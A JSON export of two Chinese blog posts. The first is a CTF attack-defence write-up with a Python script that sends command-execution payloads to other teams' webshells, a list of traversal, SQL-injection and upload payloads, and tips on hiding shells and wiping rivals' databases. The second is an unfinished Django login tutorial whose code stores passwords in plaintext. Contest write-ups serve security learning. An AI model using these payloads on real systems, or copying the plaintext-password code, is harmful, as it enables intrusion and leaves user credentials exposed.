[{"title":"6月9新警-易霖博杯网络安全技能大赛","url":"https://www.xjseck.com/2018/06/11/6月9新警-易霖博杯网络安全技能大赛/","content":"<h2 id=\"描述\"><a href=\"#描述\" class=\"headerlink\" title=\"描述\"></a>描述</h2><p>  这次比赛从最初的想法提出应该是从5月初，警察学院的曹兄和我聊的时候，就想为上学期间交一份不枉此<br>行的答卷，也为自己后续的学弟学妹们开阔一下学习交流的空间。本想是做一个内部交流的友谊赛，但是后面的决策，都是一些大佬说的算，最后也就是促成6月9号最终的比赛形式了，后面有机会还是想搞一个比较传统的CTF比赛，从线上到线下，自主命题线上和线下题目。CTF和Web渗透测试也算是玩的比较久的，现成的题目也积累了相对比较多，这一方面有感兴趣的小伙伴可以私下交流一下，具体的题目资源和本学校的信息安全协会都会有相应的介绍，关于CTF比赛WEB解题的模式，可以参考github上面的内容 <a href=\"https://github.com/Huseck/CTF\" target=\"_blank\" rel=\"noopener\">github</a>最后贴上几个图片吧。</p>\n<p><img src=\"ctfwp.png\" alt=\"图片描述\"><br><img src=\"6.png\" alt=\"图片描述\"><br><img src=\"66.png\" alt=\"图片描述\"></p>\n<h2 id=\"题目wp\"><a href=\"#题目wp\" class=\"headerlink\" title=\"题目wp\"></a>题目wp</h2><ol>\n<li>首先拿到题目，就比较懵逼，这比赛的感觉就不吐槽了，上来就是web版的ssh 才可以使用，只能一个人进行操作。</li>\n<li>两个Web服务器，配搭着各种服务和漏洞。server1  root用户，web目录文件也是root，所以这个很蛇皮。Server2 admin用户，Web 目录文件也是admin组，这个还可以，文件权限都是777。</li>\n<li>根据以往比赛经验来看，大致的思路我这里贴一下，后面再介绍此次比赛所用到的姿势。</li>\n</ol>\n<blockquote>\n<p>1、备份。源码以及数据库，可以备份到隐蔽的目录（.xx）下，顺便down到本地（Win下：Winscp，FileZilla；Mac：scp，Transmit..）；<br>2、扫描后门。有的比赛主办方留有后门，利用安全狗、D盾这类软件来扫描源码，快速定位并利用；或者利用seay的代码审计工具也可快速扫描到后门；<br>3、弱口令。绝大多数情况下，所有队伍的Web后台、phpmyadmin等服务的管理密码都一样，快速修改自己密码（无关紧要的可直接mv来改名）并利用；<br>4、自写敏感功能。主办方可能已经把CMS本身的漏洞补全了，并自写了一些敏感功能，如上传、包含界面..，这时候需要自己手动去发现（利用seay代码审计工具可快速定位、ls -t按修改时间来看最新被修改的文件），分析，删除，利用；<br>5、监测文件上传时间可快速发现他人shell，并加以利用。我们上传的shell也可以修改文件时间来加强混淆，touch -r 目的 源；<br>6、不要想办法提权，费时费力不讨好，给root的主办方都是假的；<br>7、开一台ssh只做一件事，tail -f *.log，看日志，不言而喻，抓他们的payload并利用；<br>8、CMS补漏洞没必要按着网上的一步一步修改源码来改，如果是一些无关紧要的功能，直接mv改名，大多数主办方只是check服务是否能正常运行；<br>9、shell使用外部接受参数进行命令调用，多POST；<br>10、权限维持很多方法，如果被种上都很恶心，不过如果挂上waf（禁止文件上传，执行任何命令均返回假flag，发现敏感字段直接exit [过滤都是假的]，…）这些都是浮云，手速还是最重要的；<br>11、为了避免自己上传的shell都一样而被别人利用于其他服务器，可以采用md5等hash来命名文件名（避免，太扎眼）或者密码；<br>12、如果被挂上内存马，并且没有权限来restart apache2下，完全可以直接在shell中（www-data 权限）下 kill -9 -1   杀死所有子进程（杀死当前用户所有进程，有权限下慎用），也可以直接killall apache2。这种操作并不会kill掉apache主进程，因为内存马是Apache启动的一个子进程；<br>13、同12，要注意守护进程的文件，这个才是最恶心的；<br>线下赛最重要的是文件、流量的监控和自身修补的防御，一人兼职边防边打往往会失去好多分  </p>\n</blockquote>\n<ol start=\"4\">\n<li>这次题目的分析</li>\n</ol>\n<p><strong>这里多说一句，涉及的工具和资源文件，可以参考我博客(xjseck.com)上的文章 和github上的资源文件</strong></p>\n<p>一、 上来备份文件，Web版的ssh，所以这里我直接给我的web都植入了一个一句话后门，使用<br><code>#tar -cvf /tmp/web1.rar /var/www/html</code> ，然后使用菜刀进行下载就好了<br>二、 进行D盾或者我github上写好的scanshell.py 进行后门的扫描<br>web1的扫描结果<br><img src=\"web1.png\" alt=\"scanshell\"><br>web2的扫描结果<br><img src=\"web2.png\" alt=\"scanshell\"><br>到这里的时候，队友就可以补上了，我们就很快速的写好了一个简单的批量脚本了，首轮就开始了进行手动提交flag了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># coding:utf-8</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import re</span><br><span class=\"line\">flag = []</span><br><span class=\"line\">ip = [1, 2, 3, 5, 6, 7, 8]</span><br><span class=\"line\"># 105</span><br><span class=\"line\">for i in ip:</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        url = &quot;http://172.20.10&quot; + str(i) + &quot;.101&quot; + &quot;/index.php&quot;</span><br><span class=\"line\">        print url</span><br><span class=\"line\">        post = &#123;&apos;aa&apos;: &apos;system(\\&quot;cat /flaginfo.txt\\&quot;);&apos;&#125;</span><br><span class=\"line\">        a = requests.post(url, data=post, timeout=2)</span><br><span class=\"line\">        if a.status_code == 200:</span><br><span class=\"line\">            print a.text[:32]</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        pass</span><br></pre></td></tr></table></figure>\n<p>其他的shell类推一下，只要针对能取得所有的队伍flag就ok了，因为flag刷新也就那么几轮，所以也就没有写自动化提交flag的脚本了。大多数时间，是在看神仙们打架。</p>\n<p>三、 队友手动上的waf文件的时候少写了一个字母导致，丢失了20分，后面大家的访问日志就正常保存了。</p>\n<p>四、 <strong>题目漏洞汇总</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">工具扫描的shell是几个问题。</span><br><span class=\"line\">分析源代码的漏洞大致有一下几点，都是手动构造的漏洞。</span><br><span class=\"line\">1. web1/about.php?f=../../../../../../../../../../../flaginfo.txt</span><br><span class=\"line\">2. web1/reg.php?a=system(&apos;cat /flaginfo.txt&apos;);</span><br><span class=\"line\">3. web1/index.php?123=system(&apos;cat /flaginfo.txt&apos;);</span><br><span class=\"line\">4. web1/message.php?id=1 union select 1,2,group_concat(user_name),4 from users--+  注入后台用户名，mysql5.7  不能读文件好气。进入后台,user.php</span><br><span class=\"line\">&lt;?php system(&quot;cat /root/flag.txt&quot;);?&gt;</span><br><span class=\"line\">其实主办方的意思是，登录后台就能显示flag内容的，但是flag文件确实flaginfo.txt,就问你是蛇皮的吧。</span><br><span class=\"line\">5. 最后阶段的时候丢了40分，突然就明白过来，不仅限于web服务，后面发现vsftp服务，直接允许匿名用户登录，映射的目录是根目录，直接可以刷一波 ftp://172.20.108.101/flaginfo.txt</span><br><span class=\"line\">6. web1  mysql 可以进行远程登录 mysql -h -uroot -p123 进行任意队伍的web1数据库的ctf删除掉，迫使主办方进行重置，刷分。</span><br><span class=\"line\">7. web1 后台的任意文件上传 POST /user/upload.php </span><br><span class=\"line\">images/1528712524shell.php 访问web1/images/1528712524.php </span><br><span class=\"line\">8. web2/index.php?aa=system(&apos;cat /flaginfo.txt&apos;);</span><br><span class=\"line\">9. web2/footer.php   POST shell=cat /flaginfo.txt</span><br><span class=\"line\">10. web2/config.php?c=system(&apos;cat /flaginfo.txt&apos;);</span><br><span class=\"line\">11. web2/.a.php?c=system(&apos;cat /flaginfo.txt&apos;);</span><br><span class=\"line\">12. web2/a.php?c=system(&apos;cat /flaginfo.txt&apos;);</span><br><span class=\"line\">13. search.php?id=1  SQLMAP 跑后台密码，登录出flag 但是 又蛇皮</span><br><span class=\"line\">14. 登录后有任意文件上传 </span><br><span class=\"line\">web2 的详细wp可以参考主办方提供的wp，上传到了github上了。</span><br></pre></td></tr></table></figure>\n<h2 id=\"防护\"><a href=\"#防护\" class=\"headerlink\" title=\"防护\"></a>防护</h2><p>  从上面的思路就可以知道，只要你发现了问题，才能比较好的进行修补，这次的比赛，也就是没有check文件，进行后台动态监控，选手的操作，主办方都不知道，哈哈哈，很蛇皮的吧。要是正常一点的话，就是web服务器一旦文件丢失或者web服务器不能访问，都会被扣分。网站的文件不多，都是能一眼可以看出问题的，手工都可以删改的吧。可能有队伍发现了，我们队伍使用的waf，哈哈，贴几个waf 防护的图片。<br><img src=\"web11.png\" alt=\"waf\"><br><img src=\"web222.png\" alt=\"waf\"></p>\n<h2 id=\"花絮\"><a href=\"#花絮\" class=\"headerlink\" title=\"花絮\"></a>花絮</h2><p>  这次的比赛没有使用写好的专门的脚本，进行批量植入内存马，主要是给了root权限，和满地的shell，也就没有必要了。希望后面赛事的提高再使用吧。后面分析日志文件，发现有的队伍竟然使用web目录扫描工具，我就觉的很蛇皮，明明大家的都一样，为毛使用扫描工具呢，日志量还不是一般的大，发现是108,107,103的队伍进行扫描的，只能说大佬们的套路多:)师傅们不要打我！早知道写一个策略好了，哈哈。<br><strong>最后感谢大象安全公司，为我们此次的比赛保驾护航！</strong></p>\n<p>  <img src=\"web3.png\" alt=\"waf\"><br>  <img src=\"web4.png\" alt=\"waf\"></p>\n","categories":["CTF"],"tags":["CTF","攻防竞赛"]},{"title":"Django学习笔记(四)","url":"https://www.xjseck.com/2018/02/10/Django学习笔记-四/","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>上两篇我们学习了MVT和Models进行数据库的操作，这一篇我们还是以实例来讲解，主要学习使用Django 编写一个 注册、登录、验证码的例子。</p>\n<ul>\n<li>我们将学到如下知识：<ul>\n<li>Django forms表单样式排版</li>\n<li>验证码实现的机制 cookies session 设置</li>\n<li>Django request对象传值</li>\n<li>Django 自带的用户登录判断</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h3><p>快速上手还是多动手敲打键盘编写代码，多动手实现。直接上学例子学习，主要是先建立Django实现功能的思想，里面的细枝末节可以搜索一下相关的资料进行补充巩固学习。<br>这里介绍两种编写的方法，一种是自己设计用户登录注销管理cookies和session。另一种就是使用Django自带判断登录 注销等</p>\n<h4 id=\"例子四（1）\"><a href=\"#例子四（1）\" class=\"headerlink\" title=\"例子四（1）\"></a>例子四（1）</h4><p>验证码的部分参考<a href=\"https://strcpy.me/index.php/archives/176/\" target=\"_blank\" rel=\"noopener\">https://strcpy.me/index.php/archives/176/</a><br>每次获取的验证码都需要把上次生成的验证码消除。<br>准备工作<br>以后准备工作都是相同的，设置方面也是一直的。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$python-admin startproject project  #创建项目</span><br><span class=\"line\">$python manage.py startapp blog     #创建应用</span><br><span class=\"line\">#设置数据库、应用加载、模板文件路径</span><br><span class=\"line\">DATABASES = &#123;</span><br><span class=\"line\">    &apos;default&apos;: &#123;</span><br><span class=\"line\">        &apos;ENGINE&apos;: &apos;django.db.backends.mysql&apos;,</span><br><span class=\"line\">        &apos;NAME&apos;: &apos;django-test&apos;,</span><br><span class=\"line\">        &apos;USER&apos;: &apos;root&apos;,</span><br><span class=\"line\">        &apos;PASSWORD&apos;: &apos;seck@root...&apos;,</span><br><span class=\"line\">        &apos;HOST&apos;: &apos;127.0.0.1&apos;,</span><br><span class=\"line\">        &apos;PORT&apos;: &apos;3306&apos;,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">INSTALLED_APPS = (</span><br><span class=\"line\">    &apos;django.contrib.admin&apos;,</span><br><span class=\"line\">    &apos;django.contrib.auth&apos;,</span><br><span class=\"line\">    &apos;django.contrib.contenttypes&apos;,</span><br><span class=\"line\">    &apos;django.contrib.sessions&apos;,</span><br><span class=\"line\">    &apos;django.contrib.messages&apos;,</span><br><span class=\"line\">    &apos;django.contrib.staticfiles&apos;,</span><br><span class=\"line\">    &apos;blog&apos;,</span><br><span class=\"line\">)</span><br><span class=\"line\">TEMPLATES = [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        &apos;BACKEND&apos;: &apos;django.template.backends.django.DjangoTemplates&apos;,</span><br><span class=\"line\">        &apos;DIRS&apos;: [os.path.join(BASE_DIR, &apos;templates&apos;)],</span><br><span class=\"line\">        &apos;APP_DIRS&apos;: True,</span><br><span class=\"line\">        &apos;OPTIONS&apos;: &#123;</span><br><span class=\"line\">            &apos;context_processors&apos;: [</span><br><span class=\"line\">                &apos;django.template.context_processors.debug&apos;,</span><br><span class=\"line\">                &apos;django.template.context_processors.request&apos;,</span><br><span class=\"line\">                &apos;django.contrib.auth.context_processors.auth&apos;,</span><br><span class=\"line\">                &apos;django.contrib.messages.context_processors.messages&apos;,</span><br><span class=\"line\">            ],</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure></p>\n<p><strong>项目的文件结构如图</strong><br><img src=\"1.jpg\" alt=\"\"><br><strong>首先编写models.py 创建数据库表结构</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\">#-*- coding:utf-8 _*-</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">author:seck</span><br><span class=\"line\">time: 2018/01/28</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">from django import forms</span><br><span class=\"line\">from .views import *</span><br><span class=\"line\">class UserRegisterForm(forms.Form):</span><br><span class=\"line\">    username = forms.CharField(label=&apos;用户名&apos;,max_length=50)</span><br><span class=\"line\">    password = forms.CharField(label=&apos;密码&apos;,widget=forms.PasswordInput())</span><br><span class=\"line\">    email = forms.EmailField(label=&apos;邮箱&apos;)</span><br><span class=\"line\">    # captcha1=captcha()</span><br><span class=\"line\">class UserLoginForm(forms.Form):</span><br><span class=\"line\">    username = forms.CharField(label=&apos;用户名&apos;, max_length=50)</span><br><span class=\"line\">    password = forms.CharField(label=&apos;密码&apos;, widget=forms.PasswordInput())</span><br></pre></td></tr></table></figure></p>\n<p><strong>编写forms.py</strong></p>\n<ul>\n<li>创建类，继承form.Form</li>\n<li>页面根据类的对象自动创建html标签</li>\n<li>提交，request.POST</li>\n<li>封装到类的对象里，obj=UserInfo(request.POST)</li>\n<li>用户输入是否合法</li>\n<li>obj.is_valid()</li>\n<li>全部合法，获取全部内容</li>\n<li>obj.clean()</li>\n<li>只有有不合法</li>\n<li>obj.errors<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\">#-*- coding:utf-8 _*-</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">author:seck</span><br><span class=\"line\">time: 2018/01/28</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">from django import forms</span><br><span class=\"line\">from .views import *</span><br><span class=\"line\">class UserRegisterForm(forms.Form):</span><br><span class=\"line\">    username = forms.CharField(</span><br><span class=\"line\">        required=True,</span><br><span class=\"line\">        error_messages=&#123;&apos;required&apos;:&apos;用户名不能为空&apos;&#125;,</span><br><span class=\"line\">        label=&apos;用户名&apos;,max_length=50,widget=forms.TextInput(attrs=&#123;&apos;placeholder&apos;: &apos;Username&apos;,&apos;class&apos;:&apos;username11&apos;&#125;))</span><br><span class=\"line\">    password = forms.CharField(label=&apos;密码&apos;,widget=forms.PasswordInput())</span><br><span class=\"line\">    email = forms.EmailField(label=&apos;邮箱&apos;)</span><br><span class=\"line\">    # captcha1=captcha()</span><br><span class=\"line\">class UserLoginForm(forms.Form):</span><br><span class=\"line\">    username = forms.CharField(required=True,</span><br><span class=\"line\">        error_messages=&#123;&apos;required&apos;:&apos;用户名不能为空&apos;&#125;,label=&apos;用户名&apos;, max_length=50)</span><br><span class=\"line\">    password = forms.CharField(label=&apos;密码&apos;, widget=forms.PasswordInput())</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>attrs属性是定义在html中用户登录框的css属性名称，error_messages 确认输入的是否规范返回错误的信息比如required=True 如果没有填入用户名，就会显示“用户名不能为空”<br>细节参考<a href=\"http://www.cnblogs.com/zhaijunming5/category/892772.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/zhaijunming5/category/892772.html</a><br><a href=\"http://www.cnblogs.com/yangmv/p/5327477.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/yangmv/p/5327477.html</a></p>\n<p><strong>编写views.py进行控制数据传送</strong><br>关键点的信息就是使用session控制验证码的验证。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#coding:utf-8</span><br><span class=\"line\">from django.shortcuts import render</span><br><span class=\"line\">from django.http import HttpResponse,HttpResponseRedirect ,request</span><br><span class=\"line\">from captcha import *</span><br><span class=\"line\">from .forms import *</span><br><span class=\"line\">from .models import *</span><br><span class=\"line\"># Create your views here.</span><br><span class=\"line\">#首先显示</span><br><span class=\"line\">def index(request):</span><br><span class=\"line\">    data=[]</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        if request.session[&apos;username&apos;]:</span><br><span class=\"line\">            seesion=request.session[&apos;username&apos;]</span><br><span class=\"line\">            print seesion</span><br><span class=\"line\">            if seesion:</span><br><span class=\"line\">                data.append(seesion)</span><br><span class=\"line\">                print &quot;login success!&quot;</span><br><span class=\"line\">    except Exception , e:</span><br><span class=\"line\">        print (e)</span><br><span class=\"line\">        data.append(&apos;no login&apos;)</span><br><span class=\"line\">    title=&quot;seck&quot;</span><br><span class=\"line\">    print request.COOKIES</span><br><span class=\"line\">    # return HttpResponse(&quot;&lt;img id=&apos;verifycode&apos; src=&apos;/captcha/&apos; alt=&apos;CheckCode&apos;/&gt;&quot;)</span><br><span class=\"line\">    return render(request,&apos;blog/index.html&apos;,&#123;&apos;title&apos;:title,&apos;data&apos;:data&#125;,)</span><br><span class=\"line\">#验证码调用</span><br><span class=\"line\">def captcha(request):</span><br><span class=\"line\">    Cap = Captcha(request)</span><br><span class=\"line\">    Code =Cap.display()</span><br><span class=\"line\">    return Code</span><br><span class=\"line\">#注册</span><br><span class=\"line\">def register(request):</span><br><span class=\"line\">    if request.method == &apos;POST&apos;:</span><br><span class=\"line\">        userform =UserRegisterForm(request.POST)</span><br><span class=\"line\">        cap = request.POST.get(&apos;cap&apos;)</span><br><span class=\"line\">        ca = Captcha(request)</span><br><span class=\"line\">        if userform.is_valid():</span><br><span class=\"line\">            username = userform.cleaned_data[&apos;username&apos;]</span><br><span class=\"line\">            password = userform.cleaned_data[&apos;password&apos;]</span><br><span class=\"line\">            email = userform.cleaned_data[&apos;email&apos;]</span><br><span class=\"line\">            if ca.check(cap):</span><br><span class=\"line\">                print &quot;The code true&quot;</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                print &quot;The code error!&quot;</span><br><span class=\"line\">                return HttpResponse(&quot;验证码不正确,请刷新后重新输入！&quot;)</span><br><span class=\"line\">            if User.objects.filter(username=username):</span><br><span class=\"line\">                print &quot;The user exits&quot;</span><br><span class=\"line\">                return HttpResponse(&quot;用户名重复！&quot;)</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                User.objects.create(username=username, password=password, email=email).save()</span><br><span class=\"line\">                return HttpResponse(&apos;register success!&apos;)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        userform = UserRegisterForm()</span><br><span class=\"line\">    return render(request,&apos;blog/register.html&apos;,&#123;&apos;userform&apos;:userform,&#125;)</span><br><span class=\"line\">def login(request):</span><br><span class=\"line\">    if request.method == &quot;POST&quot;:</span><br><span class=\"line\">        userform = UserLoginForm(request.POST)</span><br><span class=\"line\">        print userform.errors.get(&apos;username&apos;)</span><br><span class=\"line\">        if userform.is_valid():</span><br><span class=\"line\">            username = userform.cleaned_data[&apos;username&apos;]</span><br><span class=\"line\">            password = userform.cleaned_data[&apos;password&apos;]</span><br><span class=\"line\">            user= User.objects.filter(username__exact=username,password__exact=password)</span><br><span class=\"line\">            if user:</span><br><span class=\"line\">                #Step1:生成随机字符串(seesionID)</span><br><span class=\"line\">                #Step2：通过cookie发送给客户端</span><br><span class=\"line\">                #Step3：服务端保存 session</span><br><span class=\"line\">                print &quot;seck&quot;</span><br><span class=\"line\">                # print user.values()[0][username]</span><br><span class=\"line\">                request.session[&apos;username&apos;]=username</span><br><span class=\"line\">                print request.session</span><br><span class=\"line\">                # return render(request,&apos;blog/index.html&apos;,&#123;&apos;userform&apos;:userform&#125;)</span><br><span class=\"line\">                return HttpResponseRedirect(&apos;/&apos;)</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                return HttpResponse(&apos;用户名或者密码错误！&apos;)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print &quot;stsrat&quot;</span><br><span class=\"line\">        userform=UserLoginForm()</span><br><span class=\"line\">    return render(request,&apos;blog/login.html&apos;,&#123;&apos;userform&apos;:userform&#125;)</span><br><span class=\"line\">def sign_out(request):</span><br><span class=\"line\">    del request.session[&apos;username&apos;]</span><br><span class=\"line\">    return HttpResponseRedirect(&apos;/&apos;)</span><br></pre></td></tr></table></figure>\n<p><strong>urls.py 的设置</strong><br>blog/urls.py<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\">#-*- coding:utf-8 _*-</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">author:seck</span><br><span class=\"line\">time: 2018/01/28</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">from django.conf.urls import include, url</span><br><span class=\"line\">from views import *</span><br><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">    # Examples:</span><br><span class=\"line\">    # url(r&apos;^$&apos;, &apos;blog_week_6.views.home&apos;, name=&apos;home&apos;),</span><br><span class=\"line\">    url(r&apos;^captcha/$&apos;,captcha),</span><br><span class=\"line\">    url(r&apos;^login/$&apos;,login),</span><br><span class=\"line\">    url(r&apos;^register/$&apos;,register),</span><br><span class=\"line\">    url(r&apos;^sign_out/$&apos;,sign_out),</span><br><span class=\"line\">    url(r&apos;&apos;, index,name=&apos;index&apos;),</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure></p>\n<p>根目录下的urls.py<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from django.conf.urls import include, url</span><br><span class=\"line\">from django.contrib import admin</span><br><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">    # Examples:</span><br><span class=\"line\">    # url(r&apos;^$&apos;, &apos;blog_week_8.views.home&apos;, name=&apos;home&apos;),</span><br><span class=\"line\">    # url(r&apos;^blog/&apos;, include(&apos;blog.urls&apos;)),</span><br><span class=\"line\">    url(r&apos;&apos;,include(&apos;blog.urls&apos;)),</span><br><span class=\"line\">    url(r&apos;^admin/&apos;, include(admin.site.urls)),</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure></p>\n<p><strong>模板文件的代码</strong><br>index.html<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;en&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    